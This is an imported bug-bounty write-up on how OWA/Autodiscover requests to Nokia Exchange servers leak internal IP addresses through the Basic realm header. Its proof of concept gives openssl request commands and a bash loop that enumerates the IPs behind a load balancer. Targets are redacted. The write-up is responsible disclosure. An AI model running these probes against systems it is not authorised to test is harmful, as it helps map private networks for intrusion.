---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-02-02_internal-ips-disclosure.md
original_filename: 2018-02-02_internal-ips-disclosure.md
title: Internal IPs disclosure
category: documents
detected_topics:
- oauth
- command-injection
- information-disclosure
tags:
- imported
- documents
- oauth
- command-injection
- information-disclosure
language: en
raw_sha256: d767ad6bec186b6da8162fdef6760c7a490b861efc74f78da891cf0062169695
text_sha256: b8ee6ceda2ac4e12307029295f17f2cc902ffc26ec54503d1fa1f44b3f084fc9
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Internal IPs disclosure

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-02-02_internal-ips-disclosure.md
- Source Type: markdown
- Detected Topics: oauth, command-injection, information-disclosure
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `d767ad6bec186b6da8162fdef6760c7a490b861efc74f78da891cf0062169695`
- Text SHA256: `b8ee6ceda2ac4e12307029295f17f2cc902ffc26ec54503d1fa1f44b3f084fc9`


## Content

---
title: "Internal IPs disclosure"
page_title: "NOKIA HOF – INTERNAL IPS DISCLOSURE – @omespino"
url: "http://omespino.com/nokia-internal-ips-disclosure"
final_url: "https://omespino.com/nokia-internal-ips-disclosure/"
authors: ["Omar Espino (@omespino)"]
programs: ["Nokia"]
bugs: ["Information disclosure"]
publication_date: "2018-02-02"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5989
---

INFOLEAKN/A[February 2018](/nokia-internal-ips-disclosure/)

# NOKIA HOF – INTERNAL IPS DISCLOSURE

**Introduction**  
Hi everyone this is a write up about how do I got into the Nokia security Program Hall of Fame, so here we go:

Note: this bug has been reported in about 10 companies and only Nokia accepted it as a valid report

Do you think that internal IP disclosure is a security flaw? Share your thoughts in the comments

**Report summary**

Hi NOKIA sec team, I’ve found that some of your servers are disclosing INTERNAL IP’s thought OWA bug

Title Disclosing NOKIA servers INTERNAL IPs  
Product / URL: somesite.com(X.X.X.X)

Description and Impact  
Multiple issues have been discovered that make it possible to disclose INTERNAL IP ADDRESSES of remote Microsoft Exchange environments. This includes internal addresses of the Client Access Server (CAS) which hosts services such as Outlook Web App (OWA), Autodiscover and some IIS servers.

Since NOKIA servers are behind of F5 Big IP Load Balancer, each request is taken by different servers each time allowing to list the INTERNAL IPs ADDRESSES on some servers in NOKIA’s network

For reference see <http://h.foofus.net/?p=758> and reference BID 69018 at <http://www.securityfocus.com/bid/69018/references>

Reproduction Instructions / Proof of Concept

POC

Vulnerable Server:  
OWA Server: somesite.com (X.X.X.X)

curl -i https://somesite.com (X.X.X.X)  
HTTP/1.0 302 Found  
Location: https://somesite.com/owa/  
—————————————-  
Server: BigIP  
—————————————-  
Connection: Keep-Alive  
Content-Length: 0

1.- Open a terminal, take the vuln server and send a GET request to the loadbalancer with openssl :
  
  
  echo -e "GET /Autodiscover/Autodiscover.xml HTTP/1.0\r\n" | openssl s_client -quiet -connect somesite.com:443 2>/dev/null

If the Basic Authentication is enabled ,the internal address of the underlying web server is sent back in the response to the query.

HTTP/1.1 401 Unauthorized  
Server: Microsoft-IIS/8.5  
request-id:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx  
X-SOAP-Enabled: True  
X-WSSecurity-Enabled: True  
X-WSSecurity-For: None  
X-OAuth-Enabled: True  
WWW-Authenticate: Negotiate  
WWW-Authenticate: NTLM  
————————————————  
**WWW-Authenticate: Basic realm=”X.X.X.X” (INTERNAL IP)**  
————————————————  
X-Powered-By: ASP.NET  
X-FEServer: XXXXXXXXXXXXXX  
Date: Sat, 30 Dec 2017 04:55:26 GMT  
Connection: close  
Content-Length: 0

2.- Repeat the GET request to the same server and see the results:

HTTP/1.1 401 Unauthorized  
Server: Microsoft-IIS/8.5  
request-id: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx  
X-SOAP-Enabled: True  
X-WSSecurity-Enabled: True  
X-WSSecurity-For: None  
X-OAuth-Enabled: True  
WWW-Authenticate: Negotiate  
WWW-Authenticate: NTLM  
————————————————  
**WWW-Authenticate: Basic realm=”X.X.X.X” (ANOTHER INTERNAL IP)**  
————————————————  
X-Powered-By: ASP.NET  
X-FEServer:XXXXXXXXXXXXXX  
Date: Sat, 30 Dec 2017 04:55:27 GMT  
Connection: close  
Content-Length: 0

Another ip is sent back in the response to the query.

GET petition FLOW:

The GET tosomesite.com:443 is received by the F5 Big Ip Load balancer and forward the request to the first server available.

3.- Sent an automated GET request to see how many IPs are behind the Load balancer (in this case my assumtion was that is a network with /24 mask so, I sent 255 request and for this server I was able to retrieve 2 INTERNAL IPs) :
  
  
  # Making the 255 GET request and saved in the somesite.com_shuffled.txt file
  for i in {1..255};do echo -e "GET /Autodiscover/Autodiscover.xml HTTP/1.0\r\n" | openssl s_client -quiet -connect somesite.com:443 2>/dev/null | grep realm >> somesite.com_shuffled.txt ;done
  # Sorting and filtering the filesomesite.com_shuffled.txt results
  sort somesite.com_shuffled.txt | awk -F\= {'print $2'}| uniq | sed -e s/\"//g
  

#And that’s it, I automated the GET requests for the vulnerable server and those are the results (2 VULNERABLE SERVERS with their 2 INTERNAL IPs):

**X.X.X.X**  
**X.X.X.X**

Tools: Any UNIX like terminal with OpenSSL client installed  
Is this bug public or known by third parties?

Can I reproduce this issue every time? Yes  
How did I find this bug? Manually / Other

Nokia Hof:

[![](/assets/images/2018/02/nokia-hof.webp)](/assets/images/2018/02/nokia-hof.webp)

well, that’s it, if you have any doubt, comments or suggestions just drop me a line here or on Twitter [@omespino](https://twitter.com/omespino), read you later.

[](/write-up-twitter-bug-bounty-my-1st-bugbounty-poodle-sslv3-bug-on-multiple-twitter-smtp-servers/)

[](/facebook-bug-bounty-getting-access-to-prompt-debug-dialog-and-serialized-tool-on-main-website-facebook-com/)
